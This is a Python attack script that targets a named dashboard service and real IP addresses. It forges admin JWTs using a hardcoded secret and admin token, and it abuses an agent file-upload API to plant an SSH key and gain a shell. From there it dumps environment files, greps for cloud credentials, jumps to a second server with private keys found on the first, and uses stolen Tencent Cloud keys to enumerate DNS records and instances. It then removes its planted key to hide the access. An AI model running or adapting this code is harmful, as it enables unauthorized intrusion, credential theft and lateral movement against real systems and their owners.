#!/usr/bin/env python3
# i29339 round c: land 122.51.1.87 (files-RPC); dump registry/ops/.env.local + broad cloud-cred grep;
# inspect caddy (systemd/docker/process); then JUMP from 122.51.1.87 to share-center 43.143.107.214
# using private keys already present on 122.51.1.87 (no key exfiltration) to read /etc/caddy/dnspod.env.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST="dashboard.lumiiai.cn"; JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="; ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
KEY="/tmp/akc29339"; START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def sh(cmd,keyfile=None,user="ubuntu",host="122.51.1.87",timeout=80):
    args=["ssh","-i",keyfile or KEY,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
          "-o","BatchMode=yes","-o","IdentitiesOnly=yes","-o","ConnectTimeout=15","-o","LogLevel=ERROR",
          "%s@%s"%(user,host),cmd]
    return run(args,timeout=timeout+20)
def call(path,method="GET",body=None,session=None,admin=False,timeout=30,maxlen=200000):
    url="https://%s%s"%(HOST,path)
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if session: a+=["-H","Cookie: session="+session]
    if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
    if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+20); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid,cust="aro"):
    now=int(time.time())
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
    return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())

# ---- land ----
run(["ssh-keygen","-t","ed25519","-N","","-f",KEY,"-q"],timeout=30)
pub=open(KEY+".pub").read().strip(); open("/tmp/akc_keys2","w").write(pub+"\n")
r=call("/api/admin/agents",admin=True,timeout=45)
try: agents=(json.loads(r["body"]) or {}).get("agents",[])
except: agents=[]
byid={a.get("id"):a for a in agents if a.get("id")}
# connected
a=["curl","-s","-k","-m","20","--http2","-A",UA,"-H","x-internal-token: "+ADMIN_TOKEN,"-w","\n__C__%{http_code}","https://%s/api/internal/connected-agents"%HOST]
rc,out,err=run(a,timeout=45); connected=set()
try:
    jj=json.loads(out.decode("utf-8","replace").split("__C__")[0]); arr=jj.get("agents") or jj.get("connected") or []
    if isinstance(arr,dict): arr=list(arr.values())
    for x in arr: connected.add(x if isinstance(x,str) else (x.get("id") or x.get("agentId")))
except: pass
def score(x):
    cid=x.get("id"); return (0 if cid not in connected else 1,0 if x.get("customer")=="aro" else 1,0 if str(x.get("status","")).lower()=="provisioning" else 1,1 if cid=="agent-15a45493" else 0,cid or "")
order=[x.get("id") for x in sorted([x for x in agents if x.get("id")],key=score)[:6]]
landed=None
for AID in order:
    x=byid.get(AID)
    if not x: continue
    cust=x.get("customer") or "aro"; orig={"ip":x.get("ip"),"sshUser":x.get("sshUser")}
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
    sess=forge("af0a2285-490f-11f1-ac43-525400595be1",cust)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AID,up.quote("/home/ubuntu/.ssh",safe="/"))
    run(["curl","-s","-k","-m","60","--http2","-A",UA,"-H","Cookie: session="+sess,"-F","files=@/tmp/akc_keys2;filename=authorized_keys2;type=text/plain","-w","\n__C__%{http_code}",url],timeout=80)
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
    rc,out,err=sh("id; hostname; sudo -n true 2>&1 && echo SUDO:ok",timeout=30)
    if b"uid=" in out: landed=AID; break
R("LAND",{"aid":landed,"ok":bool(landed)})
if not landed:
    R("P7_result","NO_SHELL"); R("P99_done",{"elapsed":int(time.time()-START)}); print("NO SHELL",flush=True); sys.exit(0)

harv=""
SECS=[
 ("CADDYFILE","sudo grep -niE 'dns|tencent|dnspod|tls|issuer' /etc/caddy/Caddyfile 2>/dev/null | head -50",45),
 ("SERVERV","sudo systemctl cat caddy 2>/dev/null | head -40; echo '@@UNITDIR@@'; sudo ls -la /etc/systemd/system/caddy.service.d/ 2>/dev/null; echo '@@SS443@@'; sudo ss -ltnp 2>/dev/null | grep -E ':(443|80|2019) ' | head; echo '@@PS@@'; sudo ps aux 2>/dev/null | grep -iE 'caddy|lumii-sandbox' | grep -v grep | head",55),
 ("ENVDUMP","echo '@@REGENV@@'; sudo cat /etc/lumii-registry.env 2>/dev/null; echo '@@OPSENV@@'; sudo cat /etc/lumii-ops-agent.env 2>/dev/null; echo '@@ENVLOCAL@@'; sudo cat /opt/lumii-prod/.env.local 2>/dev/null",55),
 ("BROAD","sudo grep -rIhaoE 'AKID[A-Za-z0-9]{10,}|[A-Za-z0-9_]{0,24}SECRET_(ID|KEY)[=: ]+[A-Za-z0-9/+=_-]{12,}|SecretId[=: ]+[A-Za-z0-9]{8,}' /etc/lumii-registry.env /etc/lumii-ops-agent.env /opt/lumii-prod/.env.local /opt/lumii-prod/deploy 2>/dev/null | sort -u | head -40",60),
 ("LSKEYS","sudo ls -la /home/ubuntu/.ssh /root/.ssh 2>/dev/null; echo '@@SSHCFG@@'; sudo cat /home/ubuntu/.ssh/config 2>/dev/null | head -40",45),
 ("REACH","sudo timeout 6 bash -c 'cat < /dev/null > /dev/tcp/43.143.107.214/22' 2>&1 && echo REACHABLE214 || echo NO214",30),
 ("JUMP","KEYS=$(sudo bash -c 'ls /home/ubuntu/.ssh/id_* /home/ubuntu/.ssh/*.pem /root/.ssh/id_* 2>/dev/null'); echo \"KEYS=$KEYS\"; for k in $KEYS; do out=$(sudo timeout 10 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes -i \"$k\" ubuntu@43.143.107.214 'echo OK43; sudo -n cat /etc/caddy/dnspod.env 2>/dev/null | head -25' 2>&1); echo \"==ub $k== ${out:0:400}\"; echo \"$out\" | grep -q OK43 && break; done",150),
 ("JUMP2","KEYS=$(sudo bash -c 'ls /home/ubuntu/.ssh/id_* /home/ubuntu/.ssh/*.pem /root/.ssh/id_* 2>/dev/null'); for k in $KEYS; do out=$(sudo timeout 10 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes -i \"$k\" root@43.143.107.214 'echo OK43R; sudo -n cat /etc/caddy/dnspod.env 2>/dev/null | head -25' 2>&1); echo \"==rt $k== ${out:0:300}\"; echo \"$out\" | grep -q OK43R && break; done",150),
]
for tag,cmd,tmo in SECS:
    rc,out,err=sh(cmd,timeout=tmo)
    harv+="\n@@@%s_rc%d@@@\n"%(tag,rc)+out.decode("utf-8","replace")
secs={}; cur=None; buf=[]
for line in harv.splitlines():
    if line.startswith("@@@") and line.endswith("@@@") and len(line)>7:
        if cur: secs[cur]="\n".join(buf).strip()
        cur=line.strip("@"); buf=[]
    elif cur is not None: buf.append(line)
if cur: secs[cur]="\n".join(buf).strip()
R("HARV",{"sections":{k:v[:3500] for k,v in secs.items()},"len":len(harv)})
R("HARV_RAW",harv[-14000:])
# parse creds
sid=skey=None
m=re.search(r"TENCENTCLOUD_SECRET_ID[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})",harv); sid=m.group(1) if m else None
m=re.search(r"TENCENTCLOUD_SECRET_KEY[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})",harv); skey=m.group(1) if m else None
R("CRED_FOUND",{"sid":sid,"skey_len":len(skey) if skey else 0})
sh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)
if not (sid and skey):
    R("P7_result","NO_KEY_THIS_ROUND"); R("P99_done",{"elapsed":int(time.time()-START)}); print("NO KEY",flush=True); sys.exit(0)
# ---- enumerate ----
def _sha256hex(s):
    if isinstance(s,str): s=s.encode()
    return hashlib.sha256(s).hexdigest()
def _hmac(k,m):
    if isinstance(k,str): k=k.encode()
    if isinstance(m,str): m=m.encode()
    return hmac.new(k,m,hashlib.sha256).digest()
def tc2(svc,act,ver,region,payload=None,timeout=12):
    payload=payload or {}; body=json.dumps(payload,separators=(",",":")) if payload else "{}"
    host=svc+".tencentcloudapi.com"; ts=int(time.time()); date=datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
    ct="application/json; charset=utf-8"; ch="content-type:%s\nhost:%s\nx-tc-action:%s\n"%(ct,host,act.lower()); shd="content-type;host;x-tc-action"
    cr="POST\n/\n\n"+ch+"\n"+shd+"\n"+_sha256hex(body); scope="%s/%s/tc3_request"%(date,svc)
    sts="TC3-HMAC-SHA256\n%d\n%s\n%s"%(ts,scope,_sha256hex(cr)); kd=_hmac("TC3"+skey,date); ks=_hmac(kd,svc); ksg=_hmac(ks,"tc3_request")
    sig=hmac.new(ksg,sts.encode(),hashlib.sha256).hexdigest(); auth="TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s"%(sid,scope,shd,sig)
    hdr={"Authorization":auth,"Content-Type":ct,"X-TC-Action":act,"X-TC-Version":ver,"X-TC-Timestamp":str(ts),"Host":host}
    if region: hdr["X-TC-Region"]=region
    req=urllib.request.Request("https://"+host+"/",data=body.encode(),headers=hdr,method="POST")
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ssl._create_unverified_context()); return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except: return {"Response":{"Error":{"Code":"HTTP%s"%e.code}}}
    except Exception as e: return {"Response":{"Error":{"Code":"EXC","Message":repr(e)[:100]}}}
def terr(r):
    e=(r or {}).get("Response",{}).get("Error"); return "%s:%s"%(e.get("Code"),str(e.get("Message",""))[:70]) if e else None
R("P8_identity",{"resp":(tc2("cam","GetUserAppId","2019-01-16","",{}).get("Response") or {}),"err":terr(tc2("cam","GetUserAppId","2019-01-16","",{}))})
d=tc2("dnspod","DescribeDomainList","2021-03-23","",{"Limit":200}); R("P8_dns_domains",{"err":terr(d),"resp":str((d.get("Response") or {}))[:1500]})
domains=[]
if not terr(d):
    for x in (d.get("Response",{}) or {}).get("DomainList",[]) or []: domains.append(x.get("Name"))
recs=[]
for nm in domains[:40]:
    if not nm: continue
    rr=tc2("dnspod","DescribeRecordList","2021-03-23","",{"Domain":nm,"Limit":3000}); er=terr(rr)
    if er: recs.append({"domain":nm,"err":er}); continue
    lst=(rr.get("Response",{}) or {}).get("RecordList",[]) or []
    inter=[{"name":r2.get("Name"),"type":r2.get("Type"),"value":r2.get("Value")} for r2 in lst if re.search(r"zoofi|index|tunnel|cloudflare|workers\.dev|33306|lumii|122\.51",str(r2.get("Name"))+str(r2.get("Value")),re.I)]
    recs.append({"domain":nm,"n":len(lst),"inter":inter[:50]})
R("P8_dns_records",{"items":recs[:50]})
R("P8_probe_cvm",{"err":terr(tc2("cvm","DescribeInstances","2017-03-12","ap-shanghai",{"Limit":50}))})
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
